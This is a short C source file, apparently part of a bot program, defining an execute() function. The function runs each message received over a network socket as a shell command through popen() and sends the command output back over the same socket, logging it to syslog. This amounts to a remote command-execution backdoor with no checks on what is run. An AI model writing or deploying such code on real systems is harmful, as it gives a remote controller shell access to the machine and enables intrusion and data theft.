#include"bot.h"

int execute(char* msg, char* output, int socket){

	FILE *f = popen(msg, "r");

	if(f == NULL){

		syslog(LOG_ERR, "%s\n", "so sad popen didnt work.\n");
		//printf("so sad popen didnt work.\n");

		return(-1);
	}
	
	while(fgets(output, 200, f) != NULL){
		syslog(LOG_INFO, "%s\n", output);
		//printf("%s", output);
		snprintf(msg, CMD_LENGTH, "%s\n", output);
		//if(strcmp(output,"exit") != 0)
		//	return(-2);
		//}
		int msg_size = strlen(output);
		int send_return = send(socket, output, msg_size, 0);
		if(send_return < 0){
			snprintf(output, CMD_LENGTH, "%s\n", "oh my");
		}
	}
	
	int status = pclose(f);
	if(status == -1){
		syslog(LOG_ERR, "%s\n", "pclose so sad.\n");	
		//printf("pclose sucks\n");
	}	

	return(1);	
}
